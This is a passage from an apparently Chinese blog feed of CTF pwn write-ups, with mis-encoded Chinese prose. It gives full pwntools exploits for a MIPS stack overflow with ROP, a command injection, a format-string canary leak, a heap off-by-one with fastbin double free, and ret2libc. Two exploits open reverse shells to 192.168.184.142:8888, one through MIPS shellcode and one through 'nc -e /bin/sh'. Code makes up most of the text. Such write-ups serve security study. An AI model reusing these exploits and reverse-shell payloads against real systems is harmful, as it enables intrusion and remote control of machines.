â€è¿™ä¸²å­—ç¬¦ä¸€åŒå¤åˆ¶åˆ°v11ä¸Šï¼Œæœ€åçš„æº¢å‡ºä¹Ÿæ˜¯v11çš„æº¢å‡ºï¼Œæ‰€ä»¥åœ¨è°ƒè¯•æ—¶åœ¨æ ˆä¸Šåº”æ‰¾åˆ°å¦‚ä¸‹åœ°å€å»è®¡ç®—æº¢å‡ºé•¿åº¦ï¼š</p><img src="/img/5/Screenshot_20221111_093723.png" style="zoom: 80%;" /><p>æº¢å‡ºåçš„ROPå¯ä»¥ç›´æ¥ä½¿ç”¨ä¸Šä¸€é¢˜stack_bof_02çš„ï¼Œæœ€åå°†shellcodeæ”¹ä¸ºå¯ä»¥åå¼¹shellçš„ä»£ç ã€‚</p><p>å¯ä»¥å‚è€ƒshell-stormä¸Šçš„<a href="http://shell-storm.org/shellcode/files/shellcode-860.html">ä»£ç </a>ï¼Œå†æ”¹ä¸€ä¸‹ipå’Œç«¯å£å³å¯</p><p>å®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a0, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a0, $zero, 0x1111</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    not $a1, $t4</span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4183</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    andi $a0, $v0, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $a1, 0xB821 # Port: 8888</span><br><span class="hljs-string">    ori $a1, 0xFF01</span><br><span class="hljs-string">    addi $a1, $a1, 0x0101</span><br><span class="hljs-string">    sw $a1, -8($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $a1, 0x8EB8A8C0 # IP: 192.168.184.142</span><br><span class="hljs-string">    sw $a1, -4($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFEF</span><br><span class="hljs-string">    not $a2, $t4</span><br><span class="hljs-string">    li $v0, 4170</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6962</span><br><span class="hljs-string">    ori $t0, $t0,0x2f2f</span><br><span class="hljs-string">    sw $t0, -20($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6873</span><br><span class="hljs-string">    ori $t0, 0x2f6e</span><br><span class="hljs-string">    sw $t0, -16($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a3, $zero, 0xFFFF</span><br><span class="hljs-string">    sw $a3, -12($sp)</span><br><span class="hljs-string">    sw $a3, -4($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addi $a0, $sp, -20</span><br><span class="hljs-string">    addi $t0, $sp, -20</span><br><span class="hljs-string">    sw $t0, -8($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addiu $sp, $sp, -20</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">51</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œexp</p><p><img src="/img/5/Screenshot_20221111_090644.png"></p><h3 id="socket-cmd"><a href="#socket-cmd" class="headerlink" title="socket_cmd"></a>socket_cmd</h3><p>ä½¿ç”¨snprintfå‡½æ•°ï¼Œæ§åˆ¶å¤§å°ä¸º0x64ï¼Œç¨‹åºæ— æ ˆæº¢å‡ºæ¼æ´ã€‚å°†v10çš„å­—ç¬¦ç›´æ¥æ‹¿å»å’Œâ€œecho â€æ‹¼æ¥åå»ä½œä¸ºsystemçš„å‚æ•°ï¼Œç„¶åè¾“å‡ºå­—ç¬¦ä¸²ï¼›å¯ä»¥ä½¿ç”¨â€˜&amp;â€™å­—ç¬¦ï¼Œå½“æ‰§è¡Œå®Œè¾“å‡ºåç»§ç»­æ‰§è¡Œè‡ªå·±å†™å…¥çš„å‘½ä»¤ã€‚</p><p><img src="/img/5/Screenshot_20221112_023231.png"></p><p>å°±æœ‰å¦‚ä¸‹expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åå¼¹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;nc -e /bin/sh 192.168.184.142 8888&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåï¼š<br><img src="/img/5/Screenshot_20221112_023610.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å†³èµ› pwn</title>
    <link href="/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/"/>
    <url>/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›æ—¶é—´åªæœ‰3ä¸ªå°æ—¶ï¼Œè¿™é‡Œæˆ‘åªå†™å‡ºäº†echoã€heroï¼Œè¿˜ä¸€é“choiceæ²¡æ—¶é—´å»å†™äº†ï¼Œåç»­è‡ªå·±åœ¨æœ¬åœ°å¤ç°äº†ä¸€ä¸‹ã€‚</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="/img/3/Screenshot_20221105_115756.png"></p><p>å…ˆåˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²è¯»å‡ºcanaryçš„å€¼ç»•è¿‡æ£€æŸ¥</p><p>åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²ä¿®æ”¹0x601068åœ°å€çš„å€¼ï¼Œä¿®æ”¹ä¸ºå­—ç¬¦ä¸²<code>/bin/sh\x00</code></p><p>å†åˆ©ç”¨æ ˆæº¢å‡ºå’Œsystemå‡½æ•°æ‰§è¡ŒROP</p><p><img src="/img/3/Screenshot_20221105_121837.png"></p><p>å¼€å§‹æˆ‘æƒ³ä¸€æ¬¡æ€§ä¿®æ”¹å¤šä¸ªå­—èŠ‚ï¼Œä½†å¥½åƒæœ‰canaryä»¥åŠç¼“å†²åŒºå¤ªå°çš„åŸå› ï¼Œå½“æ—¶ä¸€ç›´ä¸æˆåŠŸï¼Œæ‰€ä»¥å°±æ¯æ¬¡åªä¿®æ”¹ä¸€ä¸ªå­—èŠ‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;echo&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./echo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50004</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>bss = <span class="hljs-number">0x601068</span><br><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;%11$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>bin_sh = <span class="hljs-number">0x0068732f6e69622f</span><br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%98c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">1</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%105c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%110c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">3</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%115c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">5</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%104c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">6</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">7</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br><br>payload = <span class="hljs-string">b&#x27;quit&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) +  p64(<span class="hljs-number">0x4005e9</span>) + p64(<span class="hljs-number">0x400903</span>) + p64(bss) + p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hero"><a href="#hero" class="headerlink" title="hero"></a>hero</h3><p>åœ¨editå‡½æ•°ä¸­æœ‰ä¸ªå•å­—èŠ‚æº¢å‡º</p><p><img src="/img/3/Screenshot_20221105_120111.png"></p><p>å¯ä»¥ä¼ªé€ ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„prev_sizeå¤§å°å’Œsizeå°¾å­—èŠ‚ä¸º\x00ï¼Œåœ¨ç”³è¯·é‡Šæ”¾ä¼šæœ¬æ¥æ­£å¸¸ç”³è¯·çš„å †å—åˆå¹¶ã€‚</p><p>æœ€ååˆ©ç”¨fastbinäºŒæ¬¡é‡Šæ”¾ï¼ŒæŒ‡å‘malloc_hookï¼Œ<code>__realloc_hookæ”¹ä¸ºonegadget</code> ï¼Œ <code>__malloc_hookæ”¹ä¸º__libc_reallo</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hero&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc_64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./hero&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50005</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x170</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>libc_reallo = libcbase + <span class="hljs-number">0x846c0</span><br>onegadget = libcbase + <span class="hljs-number">0xf1117</span><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>edit(<span class="hljs-number">1</span> ,<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(p64(malloc_hook - <span class="hljs-number">0x23</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">11</span> + p64(onegadget) + p64(libc_reallo + <span class="hljs-number">6</span>)<br>add(payload ,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>æœ¬åœ°å¤ç°ç¯å¢ƒï¼š2.23-0ubuntu11.3_i386</p><p>åœ¨æ­¤è¾“å…¥æ—¶åˆ©ç”¨æœ€åä¸€ä¸ªå­—èŠ‚å³å¯è¦†ç›–nbytesçš„å€¼ï¼Œç„¶ååœ¨ä¸‹ä¸€æ¬¡è¾“å…¥æ—¶è®©å…¶æ ˆæº¢å‡ºï¼Œæœ€året2libc</p><p><img src="/img/3/Screenshot_20221105_104723.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./choice&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>pay = <span class="hljs-string">b&#x27;a&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x50&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(<span class="hljs-number">0x80485bb</span>) + p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>leak = u32(p.recv(<span class="hljs-number">4</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¥¥äº‘æ¯2022 sandboxheapå’Œbitheap</title>
    <link href="/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/"/>
